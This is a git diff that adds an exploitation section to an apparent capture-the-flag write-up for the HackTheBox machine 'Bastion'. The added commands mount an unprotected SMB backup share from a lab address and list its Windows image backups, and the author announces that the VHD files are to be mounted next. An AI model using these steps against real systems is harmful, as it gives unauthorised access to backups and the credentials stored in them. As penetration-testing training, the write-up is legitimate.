@@ -96,6 +96,41 @@ Now that we know the way to go, lets exploit😎
 
 # Exploitation
 
+We can start by creating a directory we want the file to be mounted to
+
+command:```sudo mkdir /mnt/bastion_backup```
+
+Then we can mount,
+
+command:```sudo mount -t cifs //10.129.153.193/Backups /mnt/bastion_backup```
+
+```
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/bastion]
+└─$ sudo mkdir /mnt/bastion_backup             
+                                                                                                                                                                                                
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/bastion]
+└─$ sudo mount -t cifs //10.129.153.193/Backups /mnt/bastion_backup 
+Password for root@//10.129.153.193/Backups: 
+                                                                                                                                                                                                
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/bastion]
+└─$ cd /mnt/bastion_backup 
+                                                                                                                                                                                                
+┌──(bl4ck4non㉿bl4ck4non)-[/mnt/bastion_backup]
+└─$ ls -la                
+total 9
+drwxr-xr-x 2 root root 4096 Apr 16  2019 .
+drwxr-xr-x 3 root root 4096 Sep 17 04:47 ..
+-r-xr-xr-x 1 root root  116 Apr 16  2019 note.txt
+-rwxr-xr-x 1 root root    0 Feb 22  2019 SDT65CB.tmp
+drwxr-xr-x 2 root root    0 Feb 22  2019 WindowsImageBackup
+```
+The mounting was a success hehe, now we can locate the vhd files
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/febaafcb-c087-4da4-9659-f290b2018d15)
+
+Well, lets mount the ```vhd``` disk files
+
+
 
 
 
